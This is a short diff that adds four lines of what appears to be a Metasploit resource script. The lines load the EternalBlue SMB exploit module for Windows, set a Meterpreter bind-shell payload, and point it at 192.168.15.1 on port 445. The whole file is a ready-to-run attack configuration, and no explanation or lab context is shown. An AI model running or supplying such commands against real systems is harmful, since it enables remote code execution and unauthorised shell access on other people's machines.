@@ -1,0 +1,4 @@
+use exploit/windows/smb/ms17_010_eternalblue
+set PAYLOAD windows/x64/meterpreter/bind_tcp
+set RHOST 192.168.15.1
+set RPORT 445
